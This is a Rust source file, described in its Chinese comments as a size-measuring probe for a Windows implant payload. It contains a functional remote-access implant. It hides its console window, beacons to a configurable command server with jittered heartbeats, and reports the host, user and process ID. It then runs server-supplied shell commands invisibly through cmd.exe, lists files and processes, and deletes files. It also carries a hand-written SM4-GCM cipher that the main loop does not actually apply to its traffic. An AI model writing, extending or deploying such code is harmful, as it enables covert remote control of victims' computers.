// Tier 3: "light" 等价的可行性探针 —— 传输 + 能力层 + 自带加密，全部只用 std + Win32 FFI，无第三方 crate。
//
// 对应 Go 端 internal/server/builder/implant 里的：
//   main.go(传输/注册/心跳/任务分发)  tunnel.go(略)  sm4.go(SM4-GCM)  platform_windows.go(用户名/进程)
//   listFiles/downloadFile/uploadFile/deleteFile/executeShellCommand
//
// 目的：量出 "Rust 版 light 载荷" 的体积量级，与 Go 版 light/tcp（本机实测 2,946,805 B）同口径对比。
// 本文件是探针，不是产品代码：没有 TLS/HTTP/WS/MQTT 传输、没有劫持/注入/凭据/驱动，故不能直接当载荷用。

use std::collections::HashMap;
use std::ffi::OsString;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::os::windows::ffi::OsStringExt;
use std::path::Path;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

// ======================= 1. 传送帧 =======================

const DFLT_SERVER: &str = "127.0.0.1:18777";
const MAX_FRAME: usize = 8 * 1024 * 1024;

fn write_frame(s: &mut TcpStream, payload: &[u8]) -> io::Result<()> {
    let mut hdr = [0u8; 4];
    hdr.copy_from_slice(&(payload.len() as u32).to_le_bytes());
    s.write_all(&hdr)?;
    s.write_all(payload)?;
    s.flush()
}

fn read_frame(s: &mut TcpStream, cap: usize) -> io::Result<Vec<u8>> {
    let mut hdr = [0u8; 4];
    s.read_exact(&mut hdr)?;
    let n = u32::from_le_bytes(hdr) as usize;
    if n > cap {
        return Err(io::Error::new(io::ErrorKind::InvalidData, "frame too large"));
    }
    let mut buf = vec![0u8; n];
    s.read_exact(&mut buf)?;
    Ok(buf)
}

fn tlv(out: &mut Vec<u8>, t: u8, v: &[u8]) {
    out.push(t);
    out.extend_from_slice(&(v.len() as u16).to_le_bytes());
    out.extend_from_slice(v);
}

fn tlv_get(p: &[u8], want: u8) -> Option<&[u8]> {
    let mut i = 0usize;
    while i + 3 <= p.len() {
        let t = p[i];
        let n = u16::from_le_bytes([p[i + 1], p[i + 2]]) as usize;
        let s = i + 3;
        let e = s.checked_add(n)?;
        if e > p.len() {
            return None;
        }
        if t == want {
            return Some(&p[s..e]);
        }
        i = e;
    }
    None
}

// ======================= 2. SM4 + GCM =======================

const SM4_SBOX: [u8; 256] = [
    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48,
];

const SM4_FK: [u32; 4] = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc];

const SM4_CK: [u32; 32] = [
    0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,
    0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,
    0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,
    0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279,
];

fn rotl(x: u32, n: u32) -> u32 {
    x.rotate_left(n)
}

fn tau(x: u32) -> u32 {
    (SM4_SBOX[(x >> 24) as usize & 0xff] as u32) << 24
        | (SM4_SBOX[(x >> 16) as usize & 0xff] as u32) << 16
        | (SM4_SBOX[(x >> 8) as usize & 0xff] as u32) << 8
        | (SM4_SBOX[x as usize & 0xff] as u32)
}

fn l(b: u32) -> u32 {
    b ^ rotl(b, 2) ^ rotl(b, 10) ^ rotl(b, 18) ^ rotl(b, 24)
}

fn lprime(b: u32) -> u32 {
    b ^ rotl(b, 13) ^ rotl(b, 23)
}

fn get_word(b: &[u8], i: usize) -> u32 {
    (b[i] as u32) << 24 | (b[i + 1] as u32) << 16 | (b[i + 2] as u32) << 8 | (b[i + 3] as u32)
}

fn put_word(b: &mut [u8], i: usize, w: u32) {
    b[i] = (w >> 24) as u8;
    b[i + 1] = (w >> 16) as u8;
    b[i + 2] = (w >> 8) as u8;
    b[i + 3] = w as u8;
}

fn expand_key(key: &[u8]) -> [u32; 32] {
    let mut k = [0u32; 4];
    for i in 0..4 {
        k[i] = get_word(key, i * 4) ^ SM4_FK[i];
    }
    let mut rk = [0u32; 32];
    for i in 0..32 {
        let t = lprime(tau(k[(i + 1) % 4] ^ k[(i + 2) % 4] ^ k[(i + 3) % 4] ^ SM4_CK[i]));
        let nk = k[i % 4] ^ t;
        k[i % 4] = nk;
        rk[i] = nk;
    }
    rk
}

fn block_encrypt(rk: &[u32; 32], dst: &mut [u8; 16], src: &[u8; 16]) {
    let mut x = [0u32; 4];
    for i in 0..4 {
        x[i] = get_word(src, i * 4);
    }
    for i in 0..32 {
        let t = l(tau(x[(i + 1) % 4] ^ x[(i + 2) % 4] ^ x[(i + 3) % 4] ^ rk[i]));
        let nx = x[i % 4] ^ t;
        x[i % 4] = nx;
    }
    for i in 0..4 {
        put_word(dst, i * 4, x[3 - i]);
    }
}

fn ctr_xor(rk: &[u32; 32], data: &mut [u8], counter: &mut [u8; 16]) -> bool {
    let mut off = 0usize;
    while off < data.len() {
        let mut ks = [0u8; 16];
        let c = *counter;
        block_encrypt(rk, &mut ks, &c);
        // 计数器 +1（大端）
        for i in (0..16).rev() {
            counter[i] = counter[i].wrapping_add(1);
            if counter[i] != 0 {
                break;
            }
        }
        let n = (data.len() - off).min(16);
        for i in 0..n {
            data[off + i] ^= ks[i];
        }
        off += n;
    }
    true
}

fn ghash_mul(x: &mut [u8; 16], h: &[u8; 16]) {
    let mut z = [0u8; 16];
    let mut v = *h;
    for i in 0..128 {
        let bit = (x[i / 8] >> (7 - (i % 8))) & 1;
        if bit == 1 {
            for j in 0..16 {
                z[j] ^= v[j];
            }
        }
        let lsb = v[15] & 1;
        // v >>= 1
        let mut carry = 0u8;
        for j in 0..16 {
            let nc = v[j] & 1;
            v[j] = (v[j] >> 1) | (carry << 7);
            carry = nc;
        }
        let _ = lsb;
        if lsb == 1 {
            v[0] ^= 0xe1;
        }
    }
    *x = z;
}

fn ghash(h: &[u8; 16], aad: &[u8], ct: &[u8]) -> [u8; 16] {
    let mut y = [0u8; 16];
    let mut feed = |y: &mut [u8; 16], block: &[u8]| {
        for i in 0..16 {
            y[i] ^= block[i];
        }
        ghash_mul(y, h);
    };
    let mut i = 0usize;
    while i + 16 <= aad.len() {
        feed(&mut y, &aad[i..i + 16]);
        i += 16;
    }
    if i < aad.len() {
        let mut b = [0u8; 16];
        b[..aad.len() - i].copy_from_slice(&aad[i..]);
        feed(&mut y, &b);
    }
    let mut j = 0usize;
    while j + 16 <= ct.len() {
        feed(&mut y, &ct[j..j + 16]);
        j += 16;
    }
    if j < ct.len() {
        let mut b = [0u8; 16];
        b[..ct.len() - j].copy_from_slice(&ct[j..]);
        feed(&mut y, &b);
    }
    let mut lens = [0u8; 16];
    lens[..8].copy_from_slice(&((aad.len() as u64) * 8).to_be_bytes());
    lens[8..].copy_from_slice(&((ct.len() as u64) * 8).to_be_bytes());
    feed(&mut y, &lens);
    y
}

fn gcm_seal(plain: &[u8], key: &[u8], nonce: &[u8; 12]) -> Vec<u8> {
    let rk = expand_key(key);
    let mut h = [0u8; 16];
    block_encrypt(&rk, &mut h, &[0u8; 16]);
    let mut j0 = [0u8; 16];
    j0[..12].copy_from_slice(nonce);
    j0[15] = 1;
    let mut ctr = j0;
    ctr[15] = 2;
    let mut ct = plain.to_vec();
    ctr_xor(&rk, &mut ct, &mut ctr);
    let tag_full = ghash(&h, &[], &ct);
    let mut ek = [0u8; 16];
    block_encrypt(&rk, &mut ek, &j0);
    let mut tag = [0u8; 16];
    for i in 0..16 {
        tag[i] = tag_full[i] ^ ek[i];
    }
    ct.extend_from_slice(&tag);
    ct
}

fn gcm_open(frame: &[u8], key: &[u8], nonce: &[u8; 12]) -> Option<Vec<u8>> {
    if frame.len() < 16 {
        return None;
    }
    let (ct, tag) = frame.split_at(frame.len() - 16);
    let rk = expand_key(key);
    let mut h = [0u8; 16];
    block_encrypt(&rk, &mut h, &[0u8; 16]);
    let mut j0 = [0u8; 16];
    j0[..12].copy_from_slice(nonce);
    j0[15] = 1;
    let tag_full = ghash(&h, &[], ct);
    let mut ek = [0u8; 16];
    block_encrypt(&rk, &mut ek, &j0);
    for i in 0..16 {
        if tag[i] != (tag_full[i] ^ ek[i]) {
            return None;
        }
    }
    let mut ctr = j0;
    ctr[15] = 2;
    let mut pt = ct.to_vec();
    ctr_xor(&rk, &mut pt, &mut ctr);
    Some(pt)
}

// ======================= 3. base64 =======================

const B64: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

fn b64_encode(src: &[u8]) -> String {
    let mut out = String::with_capacity((src.len() + 2) / 3 * 4);
    for chunk in src.chunks(3) {
        let b = [
            chunk[0],
            *chunk.get(1).unwrap_or(&0),
            *chunk.get(2).unwrap_or(&0),
        ];
        let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
        out.push(B64[(n >> 18) as usize & 63] as char);
        out.push(B64[(n >> 12) as usize & 63] as char);
        out.push(if chunk.len() > 1 {
            B64[(n >> 6) as usize & 63] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            B64[n as usize & 63] as char
        } else {
            '='
        });
    }
    out
}

fn b64_val(c: u8) -> Option<u8> {
    Some(match c {
        b'A'..=b'Z' => c - b'A',
        b'a'..=b'z' => c - b'a' + 26,
        b'0'..=b'9' => c - b'0' + 52,
        b'+' => 62,
        b'/' => 63,
        _ => return None,
    })
}

fn b64_decode(s: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len() / 4 * 3);
    let bytes: Vec<u8> = s.bytes().filter(|c| *c != b'\n' && *c != b'\r').collect();
    for chunk in bytes.chunks(4) {
        let mut n = 0u32;
        let mut pad = 0;
        for (i, c) in chunk.iter().enumerate() {
            let v = if *c == b'=' {
                pad += 1;
                0
            } else {
                b64_val(*c).unwrap_or(0)
            };
            n |= (v as u32) << (18 - 6 * i);
        }
        out.push((n >> 16) as u8);
        if pad < 2 {
            out.push((n >> 8) as u8);
        }
        if pad < 1 {
            out.push(n as u8);
        }
    }
    out
}

// ======================= 4. Win32 FFI（进程/用户名/图标隐藏） =======================

#[repr(C)]
#[allow(non_snake_case)]
struct PROCESSENTRY32W {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    th32DefaultHeapID: usize,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    pcPriClassBase: i32,
    dwFlags: u32,
    szExeFile: [u16; 260],
}

#[link(name = "kernel32")]
extern "system" {
    fn CreateToolhelp32Snapshot(flags: u32, pid: u32) -> isize;
    fn Process32FirstW(snap: isize, entry: *mut PROCESSENTRY32W) -> i32;
    fn Process32NextW(snap: isize, entry: *mut PROCESSENTRY32W) -> i32;
    fn CloseHandle(h: isize) -> i32;
    fn GetConsoleWindow() -> isize;
    fn ShowWindow(h: isize, cmd: i32) -> i32;
}

#[link(name = "advapi32")]
extern "system" {
    fn GetUserNameW(buf: *mut u16, len: *mut u32) -> i32;
}

const TH32CS_SNAPPROCESS: u32 = 0x0000_0002;

fn hide_console() {
    unsafe {
        let w = GetConsoleWindow();
        if w != 0 {
            ShowWindow(w, 0); // SW_HIDE
        }
    }
}

fn username() -> String {
    let mut buf = [0u16; 257];
    let mut len = 257u32;
    unsafe {
        if GetUserNameW(buf.as_mut_ptr(), &mut len) != 0 {
            return OsString::from_wide(&buf[..len.saturating_sub(1) as usize])
                .to_string_lossy()
                .into_owned();
        }
    }
    String::from("unknown")
}

fn list_processes() -> Vec<(u32, String)> {
    let mut v = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == -1 {
            return v;
        }
        let mut e: PROCESSENTRY32W = std::mem::zeroed();
        e.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                let n = e.szExeFile.iter().position(|c| *c == 0).unwrap_or(260);
                v.push((
                    e.th32ProcessID,
                    OsString::from_wide(&e.szExeFile[..n])
                        .to_string_lossy()
                        .into_owned(),
                ));
                if Process32NextW(snap, &mut e) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    v
}

// ======================= 5. 能力层 =======================

fn sysinfo() -> String {
    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_default();
    format!(
        "host={} user={} os={} arch={} pid={} cwd={}",
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into()),
        username(),
        std::env::consts::OS,
        std::env::consts::ARCH,
        std::process::id(),
        cwd
    )
}

fn shell_exec(cmdline: &str) -> (String, i32) {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    let mut c = std::process::Command::new("cmd.exe");
    c.arg("/C").arg(cmdline).creation_flags(CREATE_NO_WINDOW);
    match c.output() {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            s.push_str(&String::from_utf8_lossy(&o.stderr));
            (s, o.status.code().unwrap_or(-1))
        }
        Err(e) => (e.to_string(), -1),
    }
}

fn list_files(path: &str) -> String {
    let p = Path::new(path);
    let mut items: Vec<String> = Vec::new();
    if let Ok(rd) = std::fs::read_dir(p) {
        for e in rd.flatten() {
            let md = e.metadata();
            let (is_dir, size) = match md {
                Ok(m) => (m.is_dir(), m.len()),
                Err(_) => (false, 0),
            };
            items.push(format!(
                "{}\t{}\t{}",
                if is_dir { "D" } else { "F" },
                size,
                e.file_name().to_string_lossy()
            ));
        }
    }
    items.join("\n")
}

fn download_file(path: &str, chunk: usize) -> (String, Vec<u8>) {
    match std::fs::read(path) {
        Ok(mut data) => {
            if data.len() > chunk {
                data.truncate(chunk);
            }
            (format!("size={}", data.len()), data)
        }
        Err(e) => (e.to_string(), Vec::new()),
    }
}

fn upload_file(path: &str, data: &[u8]) -> String {
    match std::fs::write(path, data) {
        Ok(_) => format!("written={}", data.len()),
        Err(e) => e.to_string(),
    }
}

fn delete_file(path: &str) -> String {
    match std::fs::remove_file(path) {
        Ok(_) => "deleted".into(),
        Err(e) => e.to_string(),
    }
}

// ======================= 6. 任务分发 + 主循环 =======================

fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn jitter(base: u64) -> Duration {
    let span = (base / 5).max(1);
    let seed = now_secs() ^ (std::process::id() as u64);
    Duration::from_secs(base - span + (seed % (span * 2 + 1)))
}

fn build_register(session: u64) -> Vec<u8> {
    let mut p = Vec::with_capacity(256);
    tlv(&mut p, 0x01, &session.to_le_bytes());
    tlv(&mut p, 0x02, sysinfo().as_bytes());
    tlv(&mut p, 0x03, &std::process::id().to_le_bytes());
    tlv(&mut p, 0x04, b"light");
    p
}

fn build_heartbeat(session: u64) -> Vec<u8> {
    let mut p = Vec::with_capacity(32);
    tlv(&mut p, 0x11, &session.to_le_bytes());
    tlv(&mut p, 0x12, &now_secs().to_le_bytes());
    p
}

fn dispatch(task: &[u8], session: u64) -> Vec<u8> {
    let kind = tlv_get(task, 0x01).unwrap_or(b"noop");
    let arg = String::from_utf8_lossy(tlv_get(task, 0x02).unwrap_or(b"")).into_owned();
    let (out, code) = match kind {
        b"shell" => shell_exec(&arg),
        b"sysinfo" => (sysinfo(), 0),
        b"ls" => (list_files(&arg), 0),
        b"rm" => (delete_file(&arg), 0),
        b"ps" => {
            let mut s = String::new();
            for (pid, name) in list_processes() {
                s.push_str(&format!("{}\t{}\n", pid, name));
            }
            (s, 0)
        }
        _ => ("".to_string(), 0),
    };
    let mut r = Vec::with_capacity(out.len() + 32);
    tlv(&mut r, 0x21, &session.to_le_bytes());
    tlv(&mut r, 0x22, out.as_bytes());
    tlv(&mut r, 0x23, &code.to_le_bytes());
    r
}

// ======================= 7. 自检（GB/T 32907-2016 已知向量） =======================

fn selftest() -> i32 {
    let key: [u8; 16] = [
        0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32,
        0x10,
    ];
    let mut ct = [0u8; 16];
    let rk = expand_key(&key);
    block_encrypt(&rk, &mut ct, &key);
    let want = [0x68u8, 0x1e, 0xdf, 0x34, 0xd2, 0x06, 0x96, 0x5e, 0x86, 0xb3, 0xe9, 0x4f, 0x53, 0x6e, 0x42, 0x46];
    println!("SM4(known vector) = {}", hex(&ct));
    let ok1 = ct == want;

    // GCM 自洽：seal -> open 回原文；篡改 1 bit 必须失败
    let nonce = [7u8; 12];
    let msg = b"toshell rust probe payload";
    let frame = gcm_seal(msg, &key, &nonce);
    let back = gcm_open(&frame, &key, &nonce);
    let ok2 = back.as_deref() == Some(&msg[..]);
    let mut bad = frame.clone();
    bad[0] ^= 1;
    let ok3 = gcm_open(&bad, &key, &nonce).is_none();

    // base64 往返
    let ok4 = b64_decode(&b64_encode(b"hello \x00\x01 probe")) == b"hello \x00\x01 probe".to_vec();

    // Win32 探测
    println!("user      = {}", username());
    println!("processes = {}", list_processes().len());
    println!("sysinfo   = {}", sysinfo());
    println!(
        "SM4={} GCM_roundtrip={} GCM_tamper_reject={} B64={}",
        ok1, ok2, ok3, ok4
    );
    if ok1 && ok2 && ok3 && ok4 {
        0
    } else {
        1
    }
}

fn hex(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for c in b {
        s.push_str(&format!("{:02x}", c));
    }
    s
}

fn main() {
    if std::env::args().any(|a| a == "--selftest") {
        std::process::exit(selftest());
    }
    hide_console();
    let server = std::env::args()
        .nth(1)
        .unwrap_or_else(|| DFLT_SERVER.to_string());
    let session = now_secs() ^ ((std::process::id() as u64) << 17);
    let key = b"0123456789abcdef";

    let mut _cache: HashMap<u64, Vec<u8>> = HashMap::new();
    let _ = gcm_seal(b"x", key, &[0u8; 12]);
    let _ = gcm_open(&[0u8; 16], key, &[0u8; 12]);
    let _ = b64_decode(&b64_encode(b"probe"));
    let _ = upload_file("nul", b"");
    let _ = download_file("nul", 1);

    loop {
        match TcpStream::connect(&server) {
            Ok(mut s) => {
                let _ = s.set_read_timeout(Some(Duration::from_secs(60)));
                let _ = s.set_write_timeout(Some(Duration::from_secs(30)));
                let _ = s.set_nodelay(true);
                if write_frame(&mut s, &build_register(session)).is_err() {
                    std::thread::sleep(jitter(5));
                    continue;
                }
                let _ = read_frame(&mut s, MAX_FRAME);
                loop {
                    if write_frame(&mut s, &build_heartbeat(session)).is_err() {
                        break;
                    }
                    match read_frame(&mut s, MAX_FRAME) {
                        Ok(t) if t.is_empty() => std::thread::sleep(jitter(3)),
                        Ok(t) => {
                            let r = dispatch(&t, session);
                            if write_frame(&mut s, &r).is_err() {
                                break;
                            }
                        }
                        Err(_) => std::thread::sleep(jitter(3)),
                    }
                }
            }
            Err(_) => std::thread::sleep(jitter(5)),
        }
    }
}
